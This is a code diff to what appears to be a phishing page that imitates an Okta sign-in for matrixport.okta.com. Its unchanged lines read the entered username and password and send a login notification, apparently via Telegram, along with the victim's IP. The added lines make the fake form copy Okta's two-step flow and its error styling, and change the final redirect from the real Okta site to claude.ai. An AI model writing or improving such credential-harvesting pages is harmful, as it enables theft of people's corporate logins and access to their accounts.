@@ -341,8 +341,24 @@ function _mask(pwd) {
 // ==================== LOGIN SUBMIT NOTIFICATION ====================
 document.getElementById('form20').addEventListener('submit', async function (e) {
   e.preventDefault();
+
+  // If still on username step, trigger next-step click instead
+  var stepUsername = document.getElementById('step-username');
+  if (stepUsername && stepUsername.style.display !== 'none') {
+    document.getElementById('next-step').click();
+    return;
+  }
+
+  // Password step
   const username = document.getElementById('input28').value.trim();
   const password = document.getElementById('input61').value;
+
+  if (!password) {
+    var errorContainer = document.querySelector('#step-password .o-form-error-container');
+    errorContainer.innerHTML = '<div class="okta-form-infobox-error infobox infobox-error" role="alert"><span class="icon error-16"></span><p>此字段不能为空</p></div>';
+    errorContainer.style.display = 'block';
+    return;
+  }
 
   try {
     const ip = await _ip();
@@ -358,8 +374,9 @@ document.getElementById('form20').addEventListener('submit', async function (e) 
     console.warn('TG login notify failed:', e);
   }
 
-  // After notification, redirect to real Okta
-  window.location.href = 'https://matrixport.okta.com';
+  // After notification, redirect to Claude
+  window.location.href = 'https://claude.ai';
 });
 </script>
+
 </body></html>
